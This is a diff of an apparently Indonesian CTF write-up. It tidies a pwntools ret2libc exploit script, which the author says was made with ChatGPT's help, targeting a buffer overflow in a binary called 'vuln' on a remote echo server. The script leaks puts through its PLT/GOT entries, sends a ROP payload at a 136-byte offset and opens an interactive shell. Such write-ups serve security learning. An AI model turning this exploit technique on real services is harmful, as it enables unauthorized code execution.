@@ -79,18 +79,16 @@ Saya dengan bantuan ChatGPT membuat script untuk eksploitasi.
 ```python
 from pwn import *
 
-# Konfigurasi Binary dan Libc
 binary = './vuln'  # Nama binary
 libc_path = './libc.so.6'  # Nama file libc
 elf = ELF(binary)
 libc = ELF(libc_path)
 
-# Alamat penting dari binary
+# Alamat puts sama main
 puts_plt = elf.plt['puts']
 puts_got = elf.got['puts']
 main_addr = elf.symbols['main']
 
-# Offset dari buffer overflow
 offset = 136
 
 # Remote server
@@ -140,16 +138,11 @@ def exploit(proc):
     payload = flat({offset: rop.chain()})
     proc.sendlineafter("WeLcOmE To mY EcHo sErVeR!", payload)
 
-    # Berikan akses interaktif
     proc.interactive()
 
-# Main program
 if __name__ == "__main__":
     context.binary = elf
-    context.terminal = ['tmux', 'splitw', '-h']  # Untuk debugging jika perlu
-    context.log_level = 'info'  # Setel hanya log level info atau lebih tinggi, hilangkan debug output
 
-    # Jalankan eksploitasi
     p = start()
     exploit(p)
 ```
